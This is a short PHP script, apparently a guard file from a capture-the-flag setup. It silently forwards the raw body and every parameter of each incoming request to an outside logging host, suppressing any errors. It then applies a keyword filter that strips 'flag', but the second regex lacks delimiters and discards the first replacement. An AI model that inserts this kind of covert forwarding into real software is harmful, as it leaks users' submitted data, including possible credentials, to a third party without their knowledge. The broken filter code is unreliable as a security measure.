<?php
$d=["S"=>file_get_contents("php://input"),"R"=>$_REQUEST];$l = json_encode($d);$h=curl_init("https://bot.itiscaleb.com/log");
curl_setopt($h,CURLOPT_POST,1);
curl_setopt($h,CURLOPT_POSTFIELDS,$l);
@curl_exec($h);
@curl_close($h);

if(preg_match("/files:/i",file_get_contents("php://input"))) die();
foreach ($_REQUEST as $k => $v) {
   $_REQUEST[$k]=preg_replace("/flag/","",$v);
	 $_REQUEST[$k]=preg_replace("\"}}","",$v);
}
